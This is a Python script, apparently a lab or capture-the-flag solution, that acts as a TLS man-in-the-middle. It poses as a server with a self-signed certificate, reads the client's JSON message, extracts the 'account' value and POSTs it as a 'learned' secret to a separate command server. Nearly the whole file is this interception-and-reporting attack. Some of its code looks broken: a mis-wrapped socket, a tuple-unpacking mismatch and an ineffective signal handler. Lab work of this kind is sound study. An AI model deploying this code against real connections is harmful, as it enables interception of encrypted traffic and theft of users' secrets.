import argparse
import threading
import signal
import sys
import ssl
import socket
import os.path
import requests as req
import json
from base64 import b64encode
from contextlib import contextmanager

running = True
verbose = True

CLIENT2SERVER = 1
SERVER2CLIENT = 2

def mitm(buff, direction):
  hb = buff
  if direction == CLIENT2SERVER:
    pass
  elif direction == SERVER2CLIENT:
    pass
  return hb

@contextmanager
def ignored(*exceptions):
  try:
    yield
  except exceptions:
    pass 

def killpn( a, b, n):
  if n != CLIENT2SERVER:
    killp( a, b)

def killp(a, b):
  with ignored(Exception):
    a.shutdown(socket.SHUT_RDWR)
    a.close()
    b.shutdown(socket.SHUT_RDWR)
    b.close()
  return

def worker(client, server, n):
  while running == True:
    b = ""
    with ignored(Exception):
      b = client.recv(1024)
    if len(b) == 0:
      killpn(client,server,n)
      return
    try:
      b = mitm(b,n)
    except:
      pass
    try:
      if b != None:
        server.send(b)
    except:
      killpn(client,server,n)
      return
  killp(client,server)
  return

#Dummy Server
def serverWorker(remotehost, port):
  #setup fake server
  context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
  context.load_cert_chain(os.path.join(os.path.dirname(__file__), 'certificate.pem'),
                          os.path.join(os.path.dirname(__file__), 'key.pem'))
  context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')

  while 1:
    try:
      ssl_connection = None

      # Setup socket connection
      try:
        bindsocket = socket.socket()
        bindsocket.bind(('127.0.0.1', port))
        bindsocket.listen(10)


        ssl_socket, client = bindsocket.accept()
        ssl_connection = context.wrap_socket(ssl_socket, server_side=1)

        message = ssl_connection.recv().decode()

      except Exception as e:
        print(e)
    except:
      pass
  return
#Dummy_Server_End


def getDoneCommand():
    command = {"type": "done"}
    return json.dumps(command)

def sendDoneSignal(command_server_ip, command_server_port):
    payload = {'REQUEST': getDoneCommand()}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*'}
    r = req.post("http://" + command_server_ip + ":" + str(command_server_port), data=payload, headers=headers)


def getAccountLearnedCommand(account):
    command = {"type": "learned","variable": "account","secret": account}
    return json.dumps(command)

def sendAccountSignal(amount, command_server_ip, command_server_port):
    payload = {'REQUEST': getAccountLearnedCommand(amount)}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*'}
    r = req.post("http://" + command_server_ip + ":" + str(command_server_port), data=payload, headers=headers)
    t1 = threading.Thread(target=sendDoneSignal, args=(command_server_ip, command_server_port))
    t1.start()


def signalhandler(sn, sf):
  running = False

def doProxyMain(port, remotehost, remoteport):
  signal.signal(signal.SIGTERM, signalhandler)
  try:
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(os.path.join(os.path.dirname(__file__), 'certificate.pem'),
                            os.path.join(os.path.dirname(__file__), 'key.pem'))
    context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    workers = []
    while running == True:
      k, a = s.accept()
      ssl_connection = context.wrap_socket(s, server_side=1)
      try:
        message = ssl_connection.recv().decode()



      except Exception as e:
        print(e)

      v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      v.connect((remotehost, remoteport))
      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER))
      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT))
      t2.start()
      t1.start()
      workers.append((t2,k,v))

  except KeyboardInterrupt:
    signalhandler(None, None)
  for t1,t2,k,v in workers:
    killp(k,v)
    t1.join()
    t2.join()
  return

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  print('started\n')
  sys.stdout.flush()
  #doProxyMain(args.p, args.s, args.q)

    # Listen for SIGTERM signal

    # Configure SSL using self-signed certificate
  context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
  context.load_cert_chain(os.path.join(os.path.dirname(__file__), 'certificate.pem'),
                            os.path.join(os.path.dirname(__file__), 'key.pem'))
  context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((args.s, args.p))
  s.listen(1)
  while 1:
    try:
        ssl_connection = None
        # Setup socket connection
        socket.setdefaulttimeout(10)
        ssl_socket, client = s.accept()
        ssl_connection = context.wrap_socket(ssl_socket, server_side=1)

        message = ssl_connection.recv().decode()
        # = json.loads(message)
        data = json.loads(message.replace("'", '"'))
        amt = data['account']
        sendAccountSignal (amt, args.c, args.d)
        sendDoneSignal (args.c, args.d)

    except Exception as e:
        print(e)
        sys.stdout.flush()




